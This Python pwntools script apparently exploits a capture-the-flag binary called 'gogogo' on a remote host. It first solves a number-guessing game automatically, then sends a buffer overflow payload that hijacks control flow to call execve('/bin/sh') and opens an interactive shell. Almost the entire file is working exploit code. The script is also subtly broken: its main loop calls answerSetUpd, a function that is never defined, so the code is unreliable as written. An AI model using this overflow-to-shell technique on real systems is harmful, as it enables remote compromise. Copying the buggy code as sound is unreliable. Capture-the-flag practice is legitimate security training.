#! /usr/bin/env python3
from pwn import *

arch = 64
challenge = './gogogo'

context.os='linux'
# context.log_level = 'debug'
if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(challenge)
# libc = ELF('libc.so.6')

local = 0
if local:
    p = process(challenge)
else:
    p = remote('120.25.148.180', '22694')


def debug():
    gdb.attach(p)
    pause()

bps = [0x48E7C0]
pie = 0
def gdba():
    if local == 0:
        return 0
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        base = int(os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1],16)
        cmd += ''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd += 'set $base={:#x}\n'.format(base)
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])

    gdb.attach(p,cmd)


def guess_init(answerSet):
    answerSet.clear()
    for i in range(1234,9876+1):
        seti=set(str(i))
        if len(seti)==4 and seti.isdisjoint(set('0')):
            answerSet.add(str(i))
    return answerSet
def compare_guess(inputStr,answerStr):

    A=0

    B=0
    for j in range(4):
        if inputStr[j]==answerStr[j]:
            A+=1
        else:
            for k in range(4):
                if inputStr[j]==answerStr[k]:
                    B+=1
    return A,B
def guess_dele(answerSet,inputStr,A,B):
    answerSetCopy = answerSet.copy()
    for answerStr in answerSetCopy:
        A1,B1=compare_guess(inputStr,answerStr)
        if A!=A1 or B!=B1:
            answerSet.remove(answerStr)


p.recvuntil('A NUMBER:\n')
p.sendline('1717986918')

p.recvuntil('A NUMBER:\n')
p.sendline('1416925456')

p.recvuntil('YOU HAVE SEVEN CHANCES TO GUESS\n')

answerSet = guess_init(set())

guess = '1234'
guess1 = '1 2 3 4'
p.sendline(guess1)
hint = p.recv(4)
p.recv(1)
print(hint)

A = int(hint[0]-48)
B = int(hint[2]-48)
print(A)
print(B)
while True:
    answerSetUpd(answerSet,guess,A,B)

    j = 0
    for i in answerSet:
        guess = i
        if j==0:
            break
    guess1 = ''
    for i in range(len(guess)):
        if i!=len(guess)-1:
            guess1 += guess[i] + ' '
        else:
            guess1 += guess[i]
    
    p.sendline(guess1)
    sleep(0.5)
    hint = p.recv(4)
    if hint == b'YOU ':
        break
    sleep(0.5)
    p.recv(1)
    print(hint)
    A = int(hint[0]-48)
    B = int(hint[2]-48)
    
p.sendline('e')
# debug()
p.recvuntil('(4) EXIT\n')
p.sendline('4')
_syscall_Syscall = 0x47CF05
# binsh = 0xc000051b18
binsh = 0xc00008be80
payload = b'/bin/sh\x00'*0x8c + p64(_syscall_Syscall) + p64(0) + p64(59) + p64(binsh) + p64(0) + p64(0)
p.recvuntil('ARE YOU SURE?\n')
# debug()
p.send(payload)
p.interactive()
